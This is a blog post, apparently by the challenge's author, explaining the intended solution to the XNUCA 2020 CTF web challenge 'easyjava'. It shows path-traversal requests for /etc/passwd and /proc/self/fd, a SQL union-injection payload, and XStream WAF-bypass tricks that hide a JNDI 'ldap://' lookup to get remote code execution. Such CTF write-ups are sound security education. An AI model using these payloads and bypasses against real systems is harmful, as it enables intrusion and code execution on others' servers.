<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>【CTF】xnuca2020 easyjava | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web 🐶 &amp;&amp; Code Reviewer">
  <meta name="keywords" content>
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="0x00 前言easyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。">
<meta name="keywords" content="ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="【CTF】xnuca2020 easyjava">
<meta property="og:url" content="http://blog.0kami.cn/2020/11/02/ctf-xnuca-2020-easyjava/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="0x00 前言easyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102151033808.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102151347649.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102151503000.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102152300777.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102152617085.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102153339331.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102154259827.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102155335403.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102155950724.png">
<meta property="og:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102164333062.png">
<meta property="og:updated_time" content="2020-11-18T14:35:36.612Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="【CTF】xnuca2020 easyjava">
<meta name="twitter:description" content="0x00 前言easyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。">
<meta name="twitter:image" content="http://blog.0kami.cn/images/xnuca-2020-easyjava/image-20201102151033808.png">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class='wrapper'>
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href='/' >
				0kami's Blog
			</a>
			<div class='menu'>
				<ul class='h-list'>
					
						<li>
							<a class='flat-box nav-home' href='/'>
								Home
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-archives' href='/archives'>
								Archives
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-about' href='/about'>
								About
							</a>
						</li>
					
				</ul>
				<div class='underline'></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search" />
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class='switcher h-list'>
				
					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
				
				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class='nav-sub container container--flex'>
			<a class="logo" class="flat-box" href='javascript:void(0)'>
				Word of Forks
			</a>

			<ul class='switcher h-list'>
				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        <article id="post-ctf-xnuca-2020-easyjava"
  class="post white-box article-type-post"
  itemscope itemprop="blogPost">
	<section class='meta'>
	<h2 class="title">
  	<a href="/2020/11/02/ctf-xnuca-2020-easyjava/">
    	【CTF】xnuca2020 easyjava
    </a>
  </h2>
	<time>
	  Nov 2, 2020
	</time>
	
    
    <div class='cats'>
        <a href="/categories/ctf/">ctf</a>
    </div>

	</section>
	
		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-预期题解"><span class="toc-number">2.</span> <span class="toc-text">0x01 预期题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-源码获取"><span class="toc-number">2.1.</span> <span class="toc-text">#1 源码获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-mybatis-SQL注入"><span class="toc-number">2.2.</span> <span class="toc-text">#2 mybatis SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-mybatis二级缓存反序列化漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">#3 mybatis二级缓存反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XStream正则waf绕过"><span class="toc-number">2.4.</span> <span class="toc-text">#4 XStream正则waf绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-高版本JNDI注入的利用"><span class="toc-number">2.5.</span> <span class="toc-text">#5 高版本JNDI注入的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-exp"><span class="toc-number">3.</span> <span class="toc-text">0x02 exp</span></a></li></ol></section>
	
	<section class="article typo">
  	<div class="article-entry" itemprop="articleBody">
    	<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>easyjava的设计思路主要来源于现实环境中遇到的一些问题，以及最近刚出的mybatis二级缓存反序列化的安全问题的一种设想。题目的设计目的主要考察选手对于实操性的漏洞的利用以及源码审计能力。</p>
<a id="more"></a>
<p>具体的考点如下：</p>
<ol>
<li>任意文件下载，/proc/self/fd的利用</li>
<li>mybatis缓存反序列化漏洞，<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26945" target="_blank" rel="noopener">CVE-2020-26945</a></li>
<li>xstream反序列化利用，简单正则waf绕过，类比fastjson unicode编码绕过</li>
<li>高版本java版本下的jndi利用</li>
</ol>
<h2 id="0x01-预期题解"><a href="#0x01-预期题解" class="headerlink" title="0x01 预期题解"></a>0x01 预期题解</h2><p>题目本身设计的功能点比较少，主要是jpg图片签名，下载和验签功能</p>
<h3 id="1-源码获取"><a href="#1-源码获取" class="headerlink" title="#1 源码获取"></a>#1 源码获取</h3><p>这里首先关注下载的接口</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102151033808.png" alt="image-20201102151033808"></p>
<p>在返回包里存在Check字段，于get请求中的sign字段是一样的内容，尝试修改filename为<code>../../../../../../etc/passwd</code></p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102151347649.png" alt="image-20201102151347649"></p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102151503000.png" alt="image-20201102151503000"></p>
<p>check字段返回了不一样的内容，这里判断可能sign值用于校验，通过才返回结果，那么修改sign字段，即可获取到当前请求的内容。接下来，由于是linux系统，我们可以通过暴力fd值来获取到当前运行的jar包内容，如<code>/proc/self/fd/4</code>来获取jar包</p>
<h3 id="2-mybatis-SQL注入"><a href="#2-mybatis-SQL注入" class="headerlink" title="#2 mybatis SQL注入"></a>#2 mybatis SQL注入</h3><p>拿到jar反编译后先看pom，其中比较容易关注的主要是两个jar包，一个是mybatis的springboot包，另一个是xstream的包</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102152300777.png" alt="image-20201102152300777"></p>
<p>如果关注cve动态的话，可以知道最近刚出的漏洞<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26945" target="_blank" rel="noopener">CVE-2020-26945</a>，虽然mybatis的版本已经进行了升级，但spring的mybatis包中的mybatis依赖并没有升级，仍然是3.5.5版本，再确定一下，是否启用了cache</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102152617085.png" alt="image-20201102152617085"></p>
<p>从mapper对应的xml配置里可以看到开启了cache配置，并且<code>findByHashAndSecret</code>接口存在注入。</p>
<p>到这里就简单了，我们只要找一下，调用点确认是否可控，即可确认是否存在注入</p>
<p><code>nese.game.controller.CheckController</code>存在链路，从文件中获取内容，并进行数据库查询，所以这边我们能达到一个注入的效果</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102153339331.png" alt="image-20201102153339331"></p>
<h3 id="3-mybatis二级缓存反序列化漏洞"><a href="#3-mybatis二级缓存反序列化漏洞" class="headerlink" title="#3 mybatis二级缓存反序列化漏洞"></a>#3 mybatis二级缓存反序列化漏洞</h3><p>接下来，继续进行审计，关注一下另一个点xstream包的安全问题。在<code>nese.game.entity.Picture</code>对象上，调用了xstream的fromXML函数，并且在<code>readObject</code>函数处对字符串类型的xml进行还原</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102154259827.png" alt="image-20201102154259827"></p>
<p>到这里就比较清晰了，我们需要利用前面发现的SQL注入点，进行注入构造任意的xml数据</p>
<p>并利用mybatis的默认二级缓存使用serialization的原理（如下图官方文档所示），来触发xstream反序列化漏洞</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102155335403.png" alt="image-20201102155335403"></p>
<p>接下来，就根据题目的签名实现，来注入任意数据，以如下代码为例，生成存在注入语句的jpg文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    String payload = &quot;evil xml&quot;;</span><br><span class="line">    File file = new File(&quot;xxxx.jpg&quot;);</span><br><span class="line">    File dest = new File(&quot;xxxx.jpg&quot;);</span><br><span class="line">    InputStream inputStream = new FileInputStream(file);</span><br><span class="line">    byte[] bytes = new byte[(int)file.length()];</span><br><span class="line">    inputStream.read(bytes);</span><br><span class="line">    InputStream destInputStream = new FileInputStream(dest);</span><br><span class="line">    String secret=&quot;&apos; union select 13,&apos;wh1t3p1g&apos;,&apos;wh1t3p1g&apos;,&apos;&quot;+payload+&quot;&apos;,&apos;aed2bebb781ae32d94c5e67185e35149&quot;;</span><br><span class="line">    String hash = &quot;aed2bebb781ae32d94c5e67185e35149&quot;;</span><br><span class="line">    ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);</span><br><span class="line">&#125;catch (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提交后可以看到具体的效果，重复提交两次，即可触发xml的反序列化</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102155950724.png" alt="image-20201102155950724"></p>
<h3 id="4-XStream正则waf绕过"><a href="#4-XStream正则waf绕过" class="headerlink" title="#4 XStream正则waf绕过"></a>#4 XStream正则waf绕过</h3><p>从题目上来看，XStream的实现需要绕过两个点：</p>
<ol>
<li><p>PureJavaReflectionProvider</p>
<p>PureJavaReflectionProvider不支持不存在无参构造函数的类的还原，以及该类如果是可序列化的，那么它的readObject不能有类属性上的还原。这是因为PureJavaReflectionProvider对于反序列化的操作，并非是一个递归的过程，有空再写这个分析：）</p>
</li>
<li><p>正则waf</p>
<p>题目并没有遵循XStream官方的类禁用方法，而是采用正则的方式先对待反序列化的xml字符串进行检测，检测通过后再进行反序列化。</p>
</li>
</ol>
<p>关于第一个点，比较容易解决，参考marshalsec对于spring jndi利用链的实现，该链符合我说的要求</p>
<p>而对于第二个点，这里没有用官方的方法，提示了我们需要对字符串上做些操作来绕过正则waf。我们参考fastjson的<code>@type</code>的unicode编码绕过方式，再看看是否对于XStream，也同样存在这种问题？</p>
<p>答案是肯定的，介绍一下XStream的编码绕过：</p>
<ol>
<li><p>针对标签黑名单的绕过</p>
<p>以spring jndi利用链为案例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当前黑名单为<code>org[.]springframework</code>，此时的绕过方法可以为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的原理在于xstream会对符合格式的16进制做转换</p>
<p><code>com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName</code></p>
<p><code>com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; i &lt; length; i++ ) &#123;</span><br><span class="line">  <span class="keyword">char</span> c = name.charAt(i);</span><br><span class="line">  <span class="keyword">if</span> (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) &#123;</span><br><span class="line">    i += dollarReplacement.length() - <span class="number">1</span>;</span><br><span class="line">    result.append(<span class="string">'$'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) &#123;</span><br><span class="line">    <span class="comment">// 处理hex格式的标签内容，其正确格式为_.xxxx</span></span><br><span class="line">    i += hexPrefix.length();</span><br><span class="line">    c = (<span class="keyword">char</span>)Integer.parseInt(name.substring(i, i + <span class="number">4</span>), <span class="number">16</span>);</span><br><span class="line">    i += <span class="number">3</span>;</span><br><span class="line">    result.append(c);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == escapeReplacementFirstChar</span><br><span class="line">             &amp;&amp; name.startsWith(escapeCharReplacement, i)) &#123;</span><br><span class="line">    i += escapeCharReplacement.length() - <span class="number">1</span>;</span><br><span class="line">    result.append(<span class="string">'_'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    result.append(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从dollarReplacement，hexPrefix，escapeCharReplacement三者来看，最终不影响我们绕过的为16进制的处理<code>_.xxxx</code>转换成实际的字符。</p>
</li>
<li><p>针对标签属性内容的绕过</p>
<p>案例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时的黑名单为<code>custom</code>，那么绕过方法可以为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span> <span class="attr">serialization</span>=<span class="string">"cust<span class="symbol">&amp;#111;</span>m"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>原理为读取属性内容时，会做符合要求的转化</p>
<p><code>com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue</code></p>
<p>该函数内容比较多，不贴出来了，从883行到942行均在处理html编码格式，并将其转化为实际的字符</p>
<p>所以这里<code>&amp;#111;</code>将转化为<code>o</code></p>
</li>
<li><p>针对标签内容的绕过</p>
<p>案例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">ldap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时的黑名单为<code>ldap://</code>，可以用如下的几种方法绕过</p>
<p><strong>a. html编码</strong></p>
<p>这部分在提取数据时，同样对html编码的内容做了转化</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;#108;</span>dap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这部分跟上面<code>标签属性内容的绕过</code>的一样，不再叙述</p>
<p><strong>b. 注释的方法</strong></p>
<p>在处理实际的标签内容时，遇到注视内容将被忽略掉</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">ld<span class="comment">&lt;!-- test --&gt;</span>ap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField</code></p>
<p><code>com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">  Event event = readEvent();</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.type == TEXT) &#123; <span class="comment">// 处理字符</span></span><br><span class="line">      String text = event.value;</span><br><span class="line">      <span class="keyword">if</span> (text != <span class="keyword">null</span> &amp;&amp; text.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (last == <span class="keyword">null</span>) &#123;</span><br><span class="line">          last = text;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (buffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer = <span class="keyword">new</span> StringBuffer(last);</span><br><span class="line">          &#125;</span><br><span class="line">          buffer.append(text);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.type != COMMENT) &#123;<span class="comment">// 非字符 且 不是注释时 跳出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event = readEvent(); <span class="comment">// 继续</span></span><br><span class="line">  &#125;</span><br><span class="line">  reset();</span><br><span class="line">  <span class="keyword">if</span> (buffer != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (last == <span class="keyword">null</span>) ? <span class="string">""</span> : last;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从前面的代码中来看，这里主要在对字符进行拼接，并且遇到注释时将跳过，所以如果在内容中添上注释也能达到绕过的效果</p>
</li>
</ol>
<p>经过上面XStream类型解析分析，我们可以构造出绕过正则waf的payload来</p>
<h3 id="5-高版本JNDI注入的利用"><a href="#5-高版本JNDI注入的利用" class="headerlink" title="#5 高版本JNDI注入的利用"></a>#5 高版本JNDI注入的利用</h3><p>在生成具体的exp后，可以对外发起JNDI连接，到这一步，我们需要去判断其为高版本jdk还是低版本的jdk。如果是低版本的jdk，我们可以直接利用codebase加载任意的class来达到命令执行的效果，而高版本的jdk只能依赖本地ObjectFactory或本地利用链来进行攻击，参考<a href="https://paper.seebug.org/942/" target="_blank" rel="noopener">KINGX的文章</a>。</p>
<p>而本题考查的为高版本jdk环境下的利用，那么就有两种选择，一为本地利用链触发命令来执行，二为本地ObjectFactory达成代码执行。</p>
<p>从题目的依赖来看，我们并不能找到一个合适的本地利用链来达成利用，那么考察的就是第二个方法的利用了。因为题目用的是spring boot embedded tomcat，所以我们能直接利用KINGX师傅文章中提到的方法，具体的利用过程不提了，可以用我的ysomap来达成命令执行的效果</p>
<p><img src="/images/xnuca-2020-easyjava/image-20201102164333062.png" alt="image-20201102164333062"></p>
<h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p><a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/easyjava/ImageUtil.java" target="_blank" rel="noopener">exp.java</a></p>

  	</div>
	  
	  <div class="article-tags tags">
      
        <a href="/tags/ctf/">ctf</a>
      
	  </div>
    

	
		<div class="art-item-footer">
				
					<span class="art-item-left"><i class="icon icon-chevron-thin-left"></i>prev：<a href="/2021/01/03/java-xstream-blacklist-bypass/" rel="prev"  title="XStream 1.4.15 Blacklist Bypass">
						XStream 1.4.15 Blacklist Bypass
					</a></span>
				
				
					<span class="art-item-right">next：<a href="/2020/05/22/java-talk-about-struts2/" rel="next"  title="【notes】struts2历史漏洞分析">
						【notes】struts2历史漏洞分析
					</a><i class="icon icon-chevron-thin-right"></i></span>
				
		</div>
	
	</section>
	
		<section id="comments">
			<div id="disqus_thread"></div>
		</section>
	
</article>
<script>
	window.subData = {
		title: '【CTF】xnuca2020 easyjava',
		tools: true
	}
</script>

      </div>
      <aside class='l_side'>
        
  <section class='m_widget about'>

<div class='header'>wh1t3p1g</div>
<div class='content'>
<div class='desc'>A Web 🐶 &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class='m_widget links'>
<div class='header'>Links</div>
<div class='content'>
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class='name'>orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class='name'>warmeng</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class='m_widget categories'>
<div class='header'>Categories</div>
<div class='content'>
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>6</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>25</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class='content'>
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18.5px; color: #202020">cms</a> <a href="/tags/ctf/" style="font-size: 14px; color: #808080">ctf</a> <a href="/tags/cve/" style="font-size: 17px; color: #404040">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 15.5px; color: #606060">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github"
          target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss"
          target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  var disqus_url = 'http://blog.0kami.cn/2020/11/02/ctf-xnuca-2020-easyjava/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
